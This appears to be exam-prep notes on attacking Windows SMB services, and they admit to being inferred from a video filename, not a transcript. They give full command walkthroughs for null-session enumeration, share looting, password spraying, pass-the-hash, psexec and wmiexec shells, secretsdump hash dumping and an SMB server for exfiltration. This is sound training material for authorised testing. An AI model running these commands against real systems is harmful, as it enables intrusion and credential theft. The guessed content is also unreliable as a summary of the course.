# What the video covers (Introduction / big picture)

Note: The transcript wasn’t provided. The following is a conservative, exam-focused summary inferred from the filename “12 - Targeting SMB.mp4” in the 01-WindowsExploitation folder. It reflects common eJPT coverage on enumerating and attacking SMB (TCP/139,445) on Windows hosts.

- How to discover and fingerprint SMB services and supported protocol versions
- Anonymous/guest access checks and null sessions
- Enumerating users, groups, and shares
- Accessing and looting SMB shares (read/write)
- Using purpose-built tools to map permissions and search for interesting files
- Credential testing/spraying and pass-the-hash over SMB
- Remote command execution over SMB (psexec/wmiexec) when you have admin
- Dumping hashes/secrets via SMB/LSA (secretsdump)
- Quick checks for common SMB weaknesses (signing, SMBv1, MS17-010)

# Flow (ordered)

1. Discover SMB and fingerprint versions
2. Run focused SMB NSE scripts (OS info, security mode, shares)
3. Check for anonymous/null session access
4. Enumerate users/groups and shares (rpcclient, enum4linux-ng)
5. List, map, and access shares (smbclient, smbmap)
6. Loot files and search for credentials/secrets
7. Test credentials or spray safely; try pass-the-hash if hashes are found
8. If admin, execute commands remotely (psexec/wmiexec) and/or dump hashes (secretsdump)
9. Assess common SMB weaknesses (SMB signing, SMBv1, MS17-010)
10. Persist/collect evidence and clean up

# Tools highlighted

- nmap + SMB NSE scripts: smb-os-discovery, smb-protocols, smb-security-mode, smb-enum-shares, smb-enum-users, smb2-security-mode, smb2-time, smb2-capabilities, smb-vuln-ms17-010 (if present)
- smbclient (Samba suite) for listing and interacting with shares
- rpcclient and lookupsid.py for null sessions and domain/user enumeration
- enum4linux / enum4linux-ng for one-shot enumeration
- smbmap for permissions mapping and recursive file listing/search
- crackmapexec (a.k.a. CME) or NetExec (nxc) for credential testing/spraying, shares, sessions, pass-the-hash
- Impacket: psexec.py, wmiexec.py, smbexec.py, atexec.py, secretsdump.py, lookupsid.py, smbclient.py
- smbget and mount.cifs for bulk downloads and mounting shares

# Typical command walkthrough (detailed, copy-paste friendly)

Tip: Set these variables to keep commands short.

```
export TARGET=10.10.10.10
export DOMAIN=''
export USER=''
export PASS=''
```

1) Discovery and quick fingerprinting

```
# Fast port check
nmap -p 139,445 -Pn -n --min-rate 5000 -oA nmap/${TARGET}_smb_quick $TARGET

# Service/OS/scripts
nmap -p 139,445 -sV -sC -O -oA nmap/${TARGET}_smb_full $TARGET

# Focused SMB scripts (safe)
nmap -p445 --script "smb-os-discovery,smb-security-mode,smb-protocols,smb2-security-mode,smb2-capabilities,smb2-time" \
    -oN nmap/${TARGET}_smb_enum.nmap $TARGET
```

2) Anonymous/null session checks

```
# List shares anonymously
smbclient -L "//$TARGET" -N

# Try forcing a protocol version if negotiation fails (examples)
smbclient -L "//$TARGET" -N -m SMB2
smbclient -L "//$TARGET" -N -m NT1   # SMB1/NT1 (older systems)

# Null session to MS-RPC (useful on older or misconfigured hosts)
rpcclient -U "" -N $TARGET
# Inside rpcclient (type these):
#   srvinfo
#   enumdomains
#   enumdomusers
#   enumdomgroups
#   queryuser 0x3e8      # example RID; iterate RIDs or use lookupsid
#   netshareenumall
#   lsaquery
```

3) Enumerate users with lookupsid/enum4linux

```
# SID brute (RID cycling) to enumerate users
lookupsid.py $TARGET | tee loot/${TARGET}_lookupsid.txt

# Broad enumeration (classic)
enum4linux -a $TARGET | tee loot/${TARGET}_e4l.txt

# enum4linux-ng alternative (often cleaner)
enum4linux-ng -A $TARGET | tee loot/${TARGET}_e4lng.txt
```

4) Share access and looting

```
# Connect to a discovered share anonymously
smbclient "//${TARGET}/SHARE" -N

# With credentials (DOMAIN optional; specify as DOMAIN/USER%PASS or -U 'USER' -W 'DOMAIN')
smbclient "//${TARGET}/SHARE" -U "${DOMAIN}/${USER}%${PASS}"

# Non-interactive, recursive download (create local dir first)
mkdir -p loot/${TARGET}_SHARE
smbclient "//${TARGET}/SHARE" -U "${DOMAIN}/${USER}%${PASS}" \
  -c "recurse ON; prompt OFF; ls; mget *" \
  | tee loot/${TARGET}_SHARE_ls.txt

# Search for juicy files by name from client side (smbclient pattern match via smbmap is often easier)
# Use smbmap for regex/recursive listing and permissions mapping
smbmap -H $TARGET -u "$USER" -p "$PASS"            # list shares + perms
smbmap -H $TARGET -u "$USER" -p "$PASS" -R SHARE   # recursive list
smbmap -H $TARGET -u "$USER" -p "$PASS" -r SHARE -A '(pass|cred|key|secret|config|backup|.kdbx|web.config)'

# Bulk download via smbget
smbget -R "smb://$TARGET/SHARE" -u "$USER" -p "$PASS" -o loot/${TARGET}_SHARE

# Mount the share (Linux) for easy grep/search
sudo mkdir -p /mnt/${TARGET}_SHARE
sudo mount -t cifs "//${TARGET}/SHARE" /mnt/${TARGET}_SHARE -o "username=$USER,password=$PASS,domain=$DOMAIN,vers=3.0"
# Search for secrets
grep -RniE '(password|passwd|pwd|credential|secret|key|token|cpassword)' /mnt/${TARGET}_SHARE 2>/dev/null
```

5) Credential testing, pass-the-hash, and share recon at scale

```
# CrackMapExec (CME) or NetExec (nxc) — try credentials and enumerate shares
crackmapexec smb $TARGET -u "$USER" -p "$PASS" --shares
# or
nxc smb $TARGET -u "$USER" -p "$PASS" --shares --continue-on-success

# Spray a password against a user list (respect lockout policies; throttle attempts)
nxc smb $TARGET -u users.txt -p 'Spring2025!' --rate 3 --max-retries 1 --continue-on-success

# Pass-the-hash (NTLM)
# If you have just the NT hash (no LM), use :NTHASH
crackmapexec smb $TARGET -u "$USER" -H "NTHASH" --shares
nxc smb $TARGET -u "$USER" -H "NTHASH" --shares

# Enumerate sessions, logged-on users, and local groups
nxc smb $TARGET -u "$USER" -p "$PASS" --sessions
nxc smb $TARGET -u "$USER" -p "$PASS" --loggedon
nxc smb $TARGET -u "$USER" -p "$PASS" --local-group "Administrators"
```

6) Remote command execution (with admin) and hash dumping

```
# psexec (creates a service; high-privileged command shell)
psexec.py ${DOMAIN}/${USER}:${PASS}@${TARGET}

# Pass-the-hash with psexec (no password; NT only)
psexec.py ${DOMAIN}/${USER}@${TARGET} -hashes :NTHASH

# wmiexec (fileless, often stealthier; semi-interactive cmd shell)
wmiexec.py ${DOMAIN}/${USER}:${PASS}@${TARGET}

# atexec (one-shot command via scheduled task)
atexec.py ${DOMAIN}/${USER}:${PASS}@${TARGET} "whoami /all"

# Dump local SAM/LSA secrets (requires admin)
secretsdump.py ${DOMAIN}/${USER}:${PASS}@${TARGET} -outputfile loot/${TARGET}_secrets

# If you only have NT hash
secretsdump.py ${DOMAIN}/${USER}@${TARGET} -hashes :NTHASH -outputfile loot/${TARGET}_secrets
```

7) Quick checks for common SMB weaknesses

```
# SMB signing and dialects
nmap -p445 --script smb2-security-mode,smb-protocols -oN nmap/${TARGET}_smb_security.nmap $TARGET

# MS17-010 (EternalBlue) check (script may be missing in newer nmap; use carefully)
nmap -p445 --script smb-vuln-ms17-010 -oN nmap/${TARGET}_ms17.nmap $TARGET
# Metasploit alternative (if allowed)
# msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS $TARGET; run; exit"
```

8) Domain controller-specific looting (if target is a DC)

```
# SYSVOL/NETLOGON often readable; look for GPP cpassword in XML
smbclient "//${TARGET}/SYSVOL" -U "${DOMAIN}/${USER}%${PASS}" -c "recurse ON; prompt OFF; mget *" -W "$DOMAIN"
grep -Rni cpassword loot/ 2>/dev/null

# Decrypt GPP cpassword if found
gpp-decrypt <base64_cpassword>
```

9) Hosting your own SMB (for exfil or staging binaries)

```
# Quick SMB server with Impacket (useful when the target pulls from you)
impacket-smbserver share ./share -smb2support
```

10) Cleanup

```
sudo umount /mnt/${TARGET}_SHARE 2>/dev/null || true
```

# Practical tips

- Force SMB dialect when negotiation fails: use smbclient -m SMB2 or -m NT1 on older hosts.
- For large shares, prefer smbget or mount.cifs + grep rather than interactive smbclient.
- In smbclient, use: recurse ON; prompt OFF; mget * for bulk pulls.
- Use smbmap first with creds to instantly see RW shares and quickly filter interesting filenames with -A.
- Avoid account lockouts: throttle sprays (e.g., nxc --rate 3), respect org policy, and prefer known creds.
- Pass-the-hash works where SMB signing doesn’t block and local admin rights exist; try with CME/NXC or Impacket.
- On DCs, immediately check SYSVOL/NETLOGON and search for cpassword in GPP XML.
- If you find web.config, unattended install files, KeePass DBs (.kdbx), VNC.ini, or backup scripts—those often contain credentials.
- secretsdump can pull local SAM hashes remotely if you have admin. On DCs, consider -just-dc (DCSync) only with domain admin creds.
- Be cautious with MS17-010 checks in production; some detectors or fragile hosts may react badly—use safe checks when possible.

# Minimal cheat sheet (one-screen flow)

```
# 1) Ports and SMB fingerprint
nmap -p 139,445 -sV -sC -oA nmap/smb $TARGET
nmap -p445 --script "smb-os-discovery,smb-security-mode,smb2-security-mode" $TARGET

# 2) Null/anonymous
smbclient -L "//$TARGET" -N
rpcclient -U "" -N $TARGET

# 3) Users/shares
enum4linux-ng -A $TARGET | tee loot/${TARGET}_e4l.txt
smbmap -H $TARGET -u "$USER" -p "$PASS"

# 4) Access/loot share
smbclient "//$TARGET/SHARE" -U "${DOMAIN}/${USER}%${PASS}" -c "recurse ON; prompt OFF; mget *"
# or
smbmap -H $TARGET -u "$USER" -p "$PASS" -r SHARE -A '(pass|cred|key|secret|config)'

# 5) Cred test / PTH
nxc smb $TARGET -u "$USER" -p "$PASS" --shares
nxc smb $TARGET -u "$USER" -H "NTHASH" --shares

# 6) RCE (admin) and dump
psexec.py ${DOMAIN}/${USER}:${PASS}@${TARGET}
secretsdump.py ${DOMAIN}/${USER}:${PASS}@${TARGET} -outputfile loot/${TARGET}_secrets
```

# Summary

This video (inferred) guides you through targeting SMB for Windows exploitation: identify SMB services, enumerate users and shares (including via null sessions), access and search shares for credentials, test/spray credentials safely, leverage pass-the-hash, execute commands remotely when you have admin, and dump credentials/hashes via SMB. The core workflow: scan → enumerate → access/loot → credential ops → RCE/dumping → report/cleanup.